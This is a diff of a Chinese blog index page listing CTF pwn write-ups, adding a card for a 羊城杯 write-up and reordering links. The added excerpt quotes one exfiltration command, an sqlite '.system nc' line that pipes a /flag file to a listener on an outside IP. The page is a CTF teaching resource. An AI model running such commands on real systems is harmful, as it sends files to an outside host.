@@ -89,12 +89,12 @@
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipey0a334j20zk0m8qpt.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclfdu6exj20zk0m87hw.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicit4jrvuj20zk0m8785.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciuja1j1j20zk0m8kjl.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeun65urj20zk0m81ii.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeuv80yoj20zk0m8kjl.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicmnywqgpj20zk0m8dwx.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeyhsblkj20zk0m81kx.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclimtf7dj20zk0m8qav.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicit31ffoj20zk0m8naf.jpg"></li>
         </ul>
       </div>
     </header>
@@ -121,7 +121,60 @@
         
 <article class="item">
   <div class="cover">
-    <a href="/2022/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" itemprop="url" title="2022巅峰极客pwn wp"><img data-src="https://tva1.sinaimg.cn/mw690/6833939bly1gipeudstjqj20zk0m8k3r.jpg"></a>
+    <a href="/2022/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF/" itemprop="url" title="羊城杯pwn wp"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1giclj9410cj20zk0m8h12.jpg"></a>
+  </div>
+  <div class="info">
+    
+<div class="meta">
+  <span class="item" title="创建时间：2022-09-04 00:40:20">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <time itemprop="dateCreated datePublished" datetime="2022-09-04T00:40:20+08:00">2022-09-04</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span>14k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span>13 分钟</span>
+  </span>
+</div>
+
+    <h3><a href="/2022/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF/" itemprop="url" title="羊城杯pwn wp">羊城杯pwn wp</a></h3>
+    <div class="excerpt">
+        # YCBSQL
+远程是上传一个 sql 文件，题目提示用 nc 带出 flag。
+优先考虑 sqlite 自带的.system 函数（抱着试一试的想法），然后找 web 手要了个 vps 监听，莫名其妙就出了。
+sql 文件内容：
+1.system nc 1.117.171.248 9997 &amp;lt;/flag
+# fakeNoOutput
+是个 httpd。最后三分钟做出来了。
+协议格式逆了半天，有个栈溢出在 upload 里，触发溢出的条件：
+
+HTTP_SERVER1_token 是系统随机生成的，得写对。token 记得用 \x00 截断
+
+开头得有个 POST...
+    </div>
+    <div class="meta footer">
+      <span>
+        <a href="/categories/CTF/" itemprop="url" title="CTF"><i class="ic i-flag"></i>CTF</a>
+      </span>
+    </div>
+    <a href="/2022/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF/" itemprop="url" title="羊城杯pwn wp" class="btn">more...</a>
+  </div>
+</article>
+
+        
+<article class="item">
+  <div class="cover">
+    <a href="/2022/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" itemprop="url" title="2022巅峰极客pwn wp"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1giciukx8a7j20zk0m8aio.jpg"></a>
   </div>
   <div class="info">
     
@@ -176,7 +229,7 @@ bargain：可以用来控制 fd。并且类型为 int，比较类型也是有符
         
 <article class="item">
   <div class="cover">
-    <a href="/2022/08/03/2022qwb/" itemprop="url" title="2022强网杯pwn部分wp"><img data-src="https://tva1.sinaimg.cn/mw690/6833939bly1giclgi503lj20zk0m8hdt.jpg"></a>
+    <a href="/2022/08/03/2022qwb/" itemprop="url" title="2022强网杯pwn部分wp"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1gicitcxhpij20zk0m8hdt.jpg"></a>
   </div>
   <div class="info">
     
@@ -227,7 +280,7 @@ dequeue 打类似 unlink 攻击，打 io file，fsop。堆风水，注意到 par
         
 <article class="item">
   <div class="cover">
-    <a href="/2022/07/24/DASCTF7%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9Bpwn%20wp/" itemprop="url" title="DASCTF7月赋能赛pwn wp"><img data-src="https://tva1.sinaimg.cn/mw690/6833939bly1gipewkhf1zj20zk0m81kx.jpg"></a>
+    <a href="/2022/07/24/DASCTF7%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9Bpwn%20wp/" itemprop="url" title="DASCTF7月赋能赛pwn wp"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1gipesrnqv3j20zk0m8ava.jpg"></a>
   </div>
   <div class="info">
     
@@ -276,7 +329,7 @@ exp:
         
 <article class="item">
   <div class="cover">
-    <a href="/2022/07/15/DSCTF%E9%83%A8%E5%88%86wp/" itemprop="url" title="DSCTF pwn 部分wp"><img data-src="https://tva1.sinaimg.cn/mw690/6833939bly1giclhtuo6nj20zk0m8ttm.jpg"></a>
+    <a href="/2022/07/15/DSCTF%E9%83%A8%E5%88%86wp/" itemprop="url" title="DSCTF pwn 部分wp"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1gicliwyw55j20zk0m8hdt.jpg"></a>
   </div>
   <div class="info">
     
@@ -330,7 +383,7 @@ add 函数和 edit 函数功能相似。add 函数 malloc 指定大小 0x108。
         
 <article class="item">
   <div class="cover">
-    <a href="/2022/07/11/2022%E8%93%9D%E5%B8%BDpwn%20wp/" itemprop="url" title="2022蓝帽pwn wp"><img data-src="https://tva1.sinaimg.cn/mw690/6833939bly1gipesng5oej20zk0m87d4.jpg"></a>
+    <a href="/2022/07/11/2022%E8%93%9D%E5%B8%BDpwn%20wp/" itemprop="url" title="2022蓝帽pwn wp"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1gipesrnqv3j20zk0m8ava.jpg"></a>
   </div>
   <div class="info">
     
@@ -386,7 +439,7 @@ r8 减去一个很大的偏移，令他小于 codebase，将 r8 赋给...
         
 <article class="item">
   <div class="cover">
-    <a href="/2022/04/06/wustctf2020_babyfmt/" itemprop="url" title="wustctf2020_babyfmt"><img data-src="https://tva1.sinaimg.cn/mw690/6833939bly1giclh0m9pdj20zk0m8hdt.jpg"></a>
+    <a href="/2022/04/06/wustctf2020_babyfmt/" itemprop="url" title="wustctf2020_babyfmt"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></a>
   </div>
   <div class="info">
     
@@ -433,7 +486,7 @@ r8 减去一个很大的偏移，令他小于 codebase，将 r8 赋给...
         
 <article class="item">
   <div class="cover">
-    <a href="/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" itemprop="url" title="Tcachebin 总结"><img data-src="https://tva1.sinaimg.cn/mw690/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></a>
+    <a href="/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" itemprop="url" title="Tcachebin 总结"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1giclx29mstj20zk0m8hdt.jpg"></a>
   </div>
   <div class="info">
     
@@ -482,7 +535,7 @@ tcache_entry 用来链接空闲的 tcache chunk，其中的 next 指针指向下
         
 <article class="item">
   <div class="cover">
-    <a href="/2022/02/02/%E5%88%A9%E7%94%A8realloc%E8%B0%83%E6%95%B4%E6%A0%88%E4%BD%BFone_gadget%E7%94%9F%E6%95%88/" itemprop="url" title="利用realloc调整栈使one_gadget生效"><img data-src="https://tva1.sinaimg.cn/mw690/6833939bly1giclfw2t96j20zk0m8x6p.jpg"></a>
+    <a href="/2022/02/02/%E5%88%A9%E7%94%A8realloc%E8%B0%83%E6%95%B4%E6%A0%88%E4%BD%BFone_gadget%E7%94%9F%E6%95%88/" itemprop="url" title="利用realloc调整栈使one_gadget生效"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1giclh3brzpj20zk0m8ann.jpg"></a>
   </div>
   <div class="info">
     
@@ -529,7 +582,7 @@ free_hook -&amp;gt; malloc_hook -&amp;gt; IO_FILE -&amp;gt; exit_hook
         
 <article class="item">
   <div class="cover">
-    <a href="/2021/11/29/SCU%E6%96%B0%E7%94%9F%E8%B5%9B2021/" itemprop="url" title="SCU新生赛2021 pwn wp"><img data-src="https://tva1.sinaimg.cn/mw690/6833939bly1gipesng5oej20zk0m87d4.jpg"></a>
+    <a href="/2021/11/29/SCU%E6%96%B0%E7%94%9F%E8%B5%9B2021/" itemprop="url" title="SCU新生赛2021 pwn wp"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1gipexe4oykj20zk0m87ji.jpg"></a>
   </div>
   <div class="info">
     
@@ -571,61 +624,6 @@ free_hook -&amp;gt; malloc_hook -&amp;gt; IO_FILE -&amp;gt; exit_hook
   </div>
 </article>
 
-        
-<article class="item">
-  <div class="cover">
-    <a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" itemprop="url" title="格式化字符串漏洞进阶"><img data-src="https://tva1.sinaimg.cn/mw690/6833939bly1gipetfk5zwj20zk0m8e81.jpg"></a>
-  </div>
-  <div class="info">
-    
-<div class="meta">
-  <span class="item" title="创建时间：2021-11-14 23:56:29">
-    <span class="icon">
-      <i class="ic i-calendar"></i>
-    </span>
-    <time itemprop="dateCreated datePublished" datetime="2021-11-14T23:56:29+08:00">2021-11-14</time>
-  </span>
-  <span class="item" title="本文字数">
-    <span class="icon">
-      <i class="ic i-pen"></i>
-    </span>
-    <span>3.1k</span>
-    <span class="text">字</span>
-  </span>
-  <span class="item" title="阅读时长">
-    <span class="icon">
-      <i class="ic i-clock"></i>
-    </span>
-    <span>3 分钟</span>
-  </span>
-</div>
-
-    <h3><a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" itemprop="url" title="格式化字符串漏洞进阶">格式化字符串漏洞进阶</a></h3>
-    <div class="excerpt">
-        之前通过攻防世界 String 已经初步了解格式化字符串漏洞的利用原理和利用方式。现在通过这道题精进。
-题目名：format_string
-提取路径：https://pan.baidu.com/s/1e9I59FhilppS9QIhQWND0A
-提取码：F1re
-# 代码审计
-checksec 一下：
-
-很简单的一道题噢，就只开了 NX 不可执行不让你 shellcode。
-扔进 IDA 观察一下，发现漏洞所在地：是个三十二位程序的格式化字符串漏洞。
-
-程序先泄露了 v3 的地址，然后有第一个格式化字符串漏洞，如果满足 v3=12 的话，触发第二个格式化字符串漏洞。
-
-一个后门函数。
-#...
-    </div>
-    <div class="meta footer">
-      <span>
-        <a href="/categories/CTF/" itemprop="url" title="CTF"><i class="ic i-flag"></i>CTF</a>
-      </span>
-    </div>
-    <a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" itemprop="url" title="格式化字符串漏洞进阶" class="btn">more...</a>
-  </div>
-</article>
-
     </div>
 
   </div>
@@ -661,7 +659,7 @@ checksec 一下：
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">17</span>
+        <span class="count">18</span>
         <span class="name">文章</span>
       </a>
     </div>
@@ -752,47 +750,7 @@ checksec 一下：
 <a href="/categories/CTF/" title="分类于 CTF">CTF</a>
 </div>
 
-    <span><a href="/2021/11/29/SCU%E6%96%B0%E7%94%9F%E8%B5%9B2021/" title="SCU新生赛2021 pwn wp">SCU新生赛2021 pwn wp</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
-</div>
-
-    <span><a href="/2021/09/25/%E7%94%B5%E7%A7%91%E6%96%B0%E7%94%9F%E8%B5%9B/" title="电科新生赛">电科新生赛</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
-</div>
-
-    <span><a href="/2022/04/06/wustctf2020_babyfmt/" title="wustctf2020_babyfmt">wustctf2020_babyfmt</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
-</div>
-
-    <span><a href="/2022/08/03/2022qwb/" title="2022强网杯pwn部分wp">2022强网杯pwn部分wp</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
-</div>
-
-    <span><a href="/2022/07/11/2022%E8%93%9D%E5%B8%BDpwn%20wp/" title="2022蓝帽pwn wp">2022蓝帽pwn wp</a></span>
+    <span><a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" title="格式化字符串漏洞进阶">格式化字符串漏洞进阶</a></span>
   </li>
 
       
@@ -803,26 +761,6 @@ checksec 一下：
 </div>
 
     <span><a href="/2021/09/03/babyrop/" title="标准32位程序ROP流程和c语言转义字符">标准32位程序ROP流程和c语言转义字符</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
-</div>
-
-    <span><a href="/2022/07/24/DASCTF7%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9Bpwn%20wp/" title="DASCTF7月赋能赛pwn wp">DASCTF7月赋能赛pwn wp</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
-</div>
-
-    <span><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" title="标准64位程序ROP流程和堆栈平衡">标准64位程序ROP流程和堆栈平衡</a></span>
   </li>
 
       
@@ -843,6 +781,66 @@ checksec 一下：
 </div>
 
     <span><a href="/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" title="Tcachebin 总结">Tcachebin 总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2022/04/06/wustctf2020_babyfmt/" title="wustctf2020_babyfmt">wustctf2020_babyfmt</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2022/07/24/DASCTF7%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9Bpwn%20wp/" title="DASCTF7月赋能赛pwn wp">DASCTF7月赋能赛pwn wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/08/20/string/" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" title="标准64位程序ROP流程和堆栈平衡">标准64位程序ROP流程和堆栈平衡</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2022/08/03/2022qwb/" title="2022强网杯pwn部分wp">2022强网杯pwn部分wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2022/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF/" title="羊城杯pwn wp">羊城杯pwn wp</a></span>
   </li>
 
   </ul>
